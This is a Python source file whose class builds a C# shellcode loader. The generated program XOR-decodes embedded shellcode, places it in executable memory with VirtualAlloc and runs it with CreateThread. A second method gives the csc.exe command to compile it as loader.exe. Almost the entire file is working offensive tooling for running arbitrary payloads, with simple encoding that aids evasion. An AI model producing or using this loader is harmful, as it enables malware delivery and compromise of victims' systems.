#!/usr/bin/env python3

class CSharpLoader:
    """Generate C# shellcode loader"""
    
    @staticmethod
    def generate(encoded_shellcode, key):
        """Create C# loader with encoded shellcode"""
        shellcode_str = ','.join([f'0x{b:02x}' for b in encoded_shellcode])
        
        template = f'''
using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{{
    class Program
    {{
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
                                         uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
                                         IntPtr lpStartAddress, IntPtr lpParameter, 
                                         uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {{
            // Encoded shellcode
            byte[] encoded = new byte[] {{ {shellcode_str} }};
            
            // Decode
            byte[] shellcode = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
            {{
                shellcode[i] = (byte)(encoded[i] ^ {key});
            }}
            
            // Allocate memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            
            // Copy shellcode
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            
            // Execute
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }}
    }}
}}
'''
        return template.strip()
    
    @staticmethod
    def get_compile_instructions():
        """Return compilation instructions"""
        return "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:loader.exe shellcode_loader.cs"